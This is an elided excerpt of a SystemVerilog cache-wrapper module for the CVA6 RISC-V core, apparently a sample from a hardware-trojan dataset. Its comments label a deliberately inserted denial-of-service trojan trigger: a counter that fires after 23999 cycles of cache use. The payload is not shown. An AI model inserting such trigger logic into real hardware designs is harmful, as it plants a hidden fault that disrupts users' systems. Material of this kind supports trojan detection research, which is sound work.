...
module cva6_hpdcache_wrapper_trojan_DoS
//  Parameters
//  {{{
#(
...
(
  ...
  generate
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=23999)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 23999;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (dcache_enable_i) trojan_counter <= trojan_counter + 1;
